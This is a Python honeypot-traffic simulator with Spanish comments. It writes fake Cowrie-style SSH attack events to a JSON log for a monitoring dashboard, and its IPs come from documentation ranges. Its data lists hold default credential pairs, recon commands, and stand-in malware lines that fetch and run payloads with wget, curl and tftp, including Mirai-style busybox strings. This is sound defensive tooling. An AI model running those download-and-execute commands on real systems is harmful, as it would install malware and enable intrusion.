"""Simulador de atacantes: escribe eventos con el mismo formato JSON que Cowrie.

Así el resto del sistema no sabe (ni le importa) si los datos son reales o simulados.
Se ejecuta dentro del servidor (THREAT_SIMULATE=1) o por separado:

    python -m app.simulator data/cowrie.json
"""

from __future__ import annotations

import asyncio
import json
import random
import sys
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

# Rangos de documentación (RFC 5737): nunca pertenecen a nadie real.
TEST_NETS = ("192.0.2", "198.51.100", "203.0.113")

CREDENTIALS = [
    ("root", "123456"), ("admin", "admin"), ("root", "password"), ("ubuntu", "ubuntu"),
    ("user", "1234"), ("test", "test"), ("pi", "raspberry"), ("root", "toor"),
    ("admin", "12345"), ("oracle", "oracle"), ("postgres", "postgres"), ("root", "root"),
]

RECON_COMMANDS = [
    "uname -a", "cat /proc/cpuinfo", "whoami", "free -m", "ls -la /tmp",
    "cat /etc/passwd", "nproc", "crontab -l",
]
MALWARE_COMMANDS = [
    "cd /tmp && wget http://malicioso.example/bot.sh",
    "curl -s http://malicioso.example/miner -o /tmp/.m",
]
BOTNET_COMMANDS = [
    "/bin/busybox ECCHI",
    "cd /tmp; tftp -g -r mips 198.51.100.7; chmod +x mips; ./mips",
    "enable; system; shell; sh; /bin/busybox MIRAI",
]

# Red de honeypots simulada. Los nombres deben coincidir con SENSORS en frontend/data.js.
SENSORS = ("fra-01", "nyc-01", "sao-01", "sgp-01", "syd-01", "jnb-01", "tyo-01")

# Escenario y su peso: la mayoría solo escanea o prueba contraseñas.
SCENARIOS = [("scan", 30), ("brute", 55), ("intrusion", 15)]


def _now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


class LogWriter:
    def __init__(self, path: Path) -> None:
        self.path = path
        self.sensor_of: dict[str, str] = {}

    def write(self, event_id: str, session: str, ip: str, **fields: Any) -> None:
        record = {"eventid": event_id, "session": session, "src_ip": ip,
                  "timestamp": _now(), "sensor": self.sensor_of.get(session, SENSORS[0]), **fields}
        with self.path.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(record, ensure_ascii=False) + "\n")


async def _session(writer: LogWriter, rng: random.Random) -> None:
    ip = f"{rng.choice(TEST_NETS)}.{rng.randint(1, 254)}"
    session = uuid.uuid4().hex[:12]
    scenario = rng.choices([s for s, _ in SCENARIOS], weights=[w for _, w in SCENARIOS])[0]
    writer.sensor_of[session] = rng.choice(SENSORS)

    writer.write("cowrie.session.connect", session, ip, src_port=rng.randint(1024, 65535), dst_port=22)
    await asyncio.sleep(rng.uniform(0.1, 0.4))

    if scenario in ("brute", "intrusion"):
        for _ in range(rng.randint(1, 4)):
            user, password = rng.choice(CREDENTIALS)
            writer.write("cowrie.login.failed", session, ip, username=user, password=password)
            await asyncio.sleep(rng.uniform(0.3, 0.9))

    if scenario == "intrusion":
        user, password = rng.choice(CREDENTIALS)
        writer.write("cowrie.login.success", session, ip, username=user, password=password)
        for command in rng.sample(RECON_COMMANDS, rng.randint(1, 2)):
            await asyncio.sleep(rng.uniform(0.4, 1.0))
            writer.write("cowrie.command.input", session, ip, input=command)
        await asyncio.sleep(rng.uniform(0.4, 1.0))
        follow_up = rng.choice([MALWARE_COMMANDS, BOTNET_COMMANDS])
        writer.write("cowrie.command.input", session, ip, input=rng.choice(follow_up))

    writer.write("cowrie.session.closed", session, ip, duration=round(rng.uniform(0.5, 30), 2))
    writer.sensor_of.pop(session, None)


async def run_simulator(path: Path, workers: int = 3, seed: int | None = None) -> None:
    """Varios atacantes en paralelo, con pausas irregulares entre sesiones."""
    writer = LogWriter(path)
    rng = random.Random(seed)

    async def worker() -> None:
        while True:
            await _session(writer, rng)
            # A veces llega una ráfaga, a veces hay calma.
            await asyncio.sleep(0.1 if rng.random() < 0.15 else rng.uniform(0.5, 2.0))

    await asyncio.gather(*(worker() for _ in range(workers)))


if __name__ == "__main__":
    target = Path(sys.argv[1] if len(sys.argv) > 1 else "data/cowrie.json")
    target.parent.mkdir(parents=True, exist_ok=True)
    print(f"Escribiendo ataques simulados en {target} (Ctrl+C para parar)")
    try:
        asyncio.run(run_simulator(target))
    except KeyboardInterrupt:
        pass
